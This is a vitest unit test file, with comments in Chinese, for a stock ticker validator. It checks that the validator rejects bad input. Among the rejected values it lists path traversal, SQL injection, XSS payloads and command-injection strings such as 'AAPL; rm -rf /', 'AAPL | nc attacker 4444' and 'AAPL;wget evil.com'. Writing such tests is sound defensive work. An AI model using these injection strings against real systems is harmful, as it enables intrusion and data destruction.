/**
 * Ticker 格式校验单元测试（T-P3-8）
 *
 * 企业理由：ticker 直接拼入子进程命令与文件路径，校验失败会导致
 * 路径遍历、命令注入、XSS 等安全漏洞。测试覆盖：
 * - 合法 ticker（股票/ETF/基金代码）
 * - 非法字符（空格、特殊符号、小写）
 * - 攻击向量（路径遍历、SQL 注入、XSS）
 * - 边界（空串、超长、null/undefined、非字符串）
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';

vi.mock('../../../api/utils/logger.js', () => ({
  logger: {
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    child: vi.fn(() => ({ info: vi.fn(), warn: vi.fn() })),
  },
}));

import {
  isValidTicker,
  validateTickerFormat,
  TICKER_PATTERN,
} from '../../../api/utils/tickerValidation.js';

describe('isValidTicker', () => {
  describe('合法 ticker', () => {
    it.each([
      ['AAPL', '美股代码'],
      ['MSFT', '美股代码'],
      ['GOOG', '美股代码'],
      ['VTI', 'ETF 代码'],
      ['510300', 'A 股数字代码'],
      ['000001.SZ', '深市后缀'],
      ['600000.SH', '沪市后缀'],
      ['510300.SH', '基金后缀'],
      ['BRK.B', '伯克希尔 B 股'],
      ['BF_B', '下划线'],
      ['A-B', '连字符'],
      ['A1', '字母数字混合'],
    ])('应接受 %s（%s）', (ticker) => {
      expect(isValidTicker(ticker)).toBe(true);
    });

    it('应接受恰好 20 字符的 ticker（长度上限）', () => {
      const ticker = 'A'.repeat(20);
      expect(isValidTicker(ticker)).toBe(true);
    });

    it('应接受单字符 ticker（长度下限）', () => {
      expect(isValidTicker('A')).toBe(true);
    });
  });

  describe('非法字符', () => {
    it.each([
      ['aapl', '小写字母'],
      ['AA PL', '空格'],
      ['AAPL!', '感叹号'],
      ['AAPL@', 'at 符号'],
      ['AAPL#', '井号'],
      ['AAPL$', '美元符'],
      ['AAPL%', '百分号'],
      ['AAPL&', '与号'],
      ['AAPL*', '星号'],
      ['AAPL(', '左括号'],
      ['AAPL)', '右括号'],
      ['AAPL+', '加号'],
      ['AAPL/', '斜杠'],
      ['AAPL:', '冒号'],
      ['AAPL;', '分号'],
      ['AAPL<', '小于号'],
      ['AAPL=', '等号'],
      ['AAPL>', '大于号'],
      ['AAPL?', '问号'],
      ['AAPL[', '左方括号'],
      ['AAPL\\', '反斜杠'],
      ['AAPL]', '右方括号'],
      ['AAPL^', '脱字符'],
      ['AAPL`', '反引号'],
      ['AAPL{', '左花括号'],
      ['AAPL|', '竖线'],
      ['AAPL}', '右花括号'],
      ['AAPL~', '波浪号'],
      ['中证500', '非 ASCII 字符'],
    ])('应拒绝 %s（%s）', (ticker) => {
      expect(isValidTicker(ticker)).toBe(false);
    });
  });

  describe('路径遍历攻击', () => {
    it.each([
      ['../etc/passwd', 'Unix 相对路径'],
      ['..\\windows\\system32', 'Windows 相对路径'],
      ['..%2fetc%2fpasswd', 'URL 编码斜杠'],
      ['..%5cwindows', 'URL 编码反斜杠'],
      ['../', '上级目录'],
      ['..\\', 'Windows 上级目录'],
      ['./secret', '当前目录'],
      ['.\\secret', 'Windows 当前目录'],
      ['/etc/passwd', '绝对路径'],
      ['C:\\Windows', 'Windows 绝对路径'],
    ])('应拒绝路径遍历向量 %s', (ticker) => {
      expect(isValidTicker(ticker)).toBe(false);
    });
  });

  describe('SQL 注入攻击', () => {
    it.each([
      ["'; DROP TABLE users; --", '删除表'],
      ["' OR '1'='1", '万能密码'],
      ["admin'--", '注释掉密码校验'],
      ['"; DELETE FROM prices; --', '双引号删除'],
      ["1; SELECT * FROM users", '堆叠查询'],
      ["' UNION SELECT * FROM users --", '联合查询'],
    ])('应拒绝 SQL 注入向量 %s', (ticker) => {
      expect(isValidTicker(ticker)).toBe(false);
    });
  });

  describe('XSS 攻击', () => {
    it.each([
      ['<script>alert(1)</script>', '脚本标签'],
      ['<img src=x onerror=alert(1)>', '图片 onerror'],
      ['"><script>alert(1)</script>', '属性闭合注入'],
      ['javascript:alert(1)', 'javascript 协议'],
      ['<svg onload=alert(1)>', 'SVG onload'],
    ])('应拒绝 XSS 向量 %s', (ticker) => {
      expect(isValidTicker(ticker)).toBe(false);
    });
  });

  describe('命令注入攻击', () => {
    it.each([
      ['AAPL; rm -rf /', '分号命令分隔'],
      ['AAPL && cat /etc/passwd', '逻辑与命令链'],
      ['AAPL | nc attacker 4444', '管道命令'],
      ['AAPL`whoami`', '反引号命令替换'],
      ['AAPL$(whoami)', '美元括号命令替换'],
      ['AAPL;wget evil.com', '下载恶意文件'],
    ])('应拒绝命令注入向量 %s', (ticker) => {
      expect(isValidTicker(ticker)).toBe(false);
    });
  });

  describe('边界与异常输入', () => {
    it('应拒绝空字符串', () => {
      expect(isValidTicker('')).toBe(false);
    });

    it('应拒绝 21 字符 ticker（超长）', () => {
      expect(isValidTicker('A'.repeat(21))).toBe(false);
    });

    it('应拒绝 1000+ 字符 ticker', () => {
      expect(isValidTicker('A'.repeat(1000))).toBe(false);
    });

    it('应拒绝 null', () => {
      expect(isValidTicker(null as unknown as string)).toBe(false);
    });

    it('应拒绝 undefined', () => {
      expect(isValidTicker(undefined as unknown as string)).toBe(false);
    });

    it('应拒绝数字类型', () => {
      expect(isValidTicker(123 as unknown as string)).toBe(false);
    });

    it('应拒绝对象类型', () => {
      expect(isValidTicker({} as unknown as string)).toBe(false);
    });

    it('应拒绝数组类型', () => {
      expect(isValidTicker([] as unknown as string)).toBe(false);
    });
  });
});

describe('TICKER_PATTERN 正则', () => {
  it('应为 /^[A-Z0-9._-]{1,20}$/', () => {
    expect(TICKER_PATTERN.source).toBe('^[A-Z0-9._-]{1,20}$');
  });
});

describe('validateTickerFormat 批量校验', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('应正确分类合法与非法 ticker', () => {
    const tickers = ['AAPL', 'msft', '000001.SZ', '../evil', 'GOOG'];
    const result = validateTickerFormat(tickers);
    expect(result.valid).toEqual(['AAPL', '000001.SZ', 'GOOG']);
    expect(result.invalid).toEqual(['msft', '../evil']);
  });

  it('全部合法时应返回空 invalid 数组', () => {
    const tickers = ['AAPL', 'MSFT', 'GOOG'];
    const result = validateTickerFormat(tickers);
    expect(result.valid).toEqual(tickers);
    expect(result.invalid).toEqual([]);
  });

  it('全部非法时应返回空 valid 数组', () => {
    const tickers = ['aapl', 'ms ft', '../evil'];
    const result = validateTickerFormat(tickers);
    expect(result.valid).toEqual([]);
    expect(result.invalid).toEqual(tickers);
  });

  it('空数组应返回空 valid 和 invalid', () => {
    const result = validateTickerFormat([]);
    expect(result.valid).toEqual([]);
    expect(result.invalid).toEqual([]);
  });

  it('存在非法 ticker时应记录警告日志', async () => {
    const { logger } = await import('../../../api/utils/logger.js');
    validateTickerFormat(['aapl', '../evil']);
    expect(logger.warn).toHaveBeenCalledTimes(1);
    expect(logger.warn).toHaveBeenCalledWith(
      expect.stringContaining('aapl'),
    );
  });

  it('全部合法时不应记录警告日志', async () => {
    const { logger } = await import('../../../api/utils/logger.js');
    validateTickerFormat(['AAPL', 'MSFT']);
    expect(logger.warn).not.toHaveBeenCalled();
  });

  it('应保留输入顺序', () => {
    const tickers = ['ZZZ', 'aaa', 'AAA', 'bbb', 'BBB'];
    const result = validateTickerFormat(tickers);
    expect(result.valid).toEqual(['ZZZ', 'AAA', 'BBB']);
    expect(result.invalid).toEqual(['aaa', 'bbb']);
  });

  it('应处理含 null/undefined 元素的数组', () => {
    const tickers = ['AAPL', null, undefined, 'MSFT'] as unknown as string[];
    const result = validateTickerFormat(tickers);
    expect(result.valid).toEqual(['AAPL', 'MSFT']);
    expect(result.invalid).toHaveLength(2);
  });
});
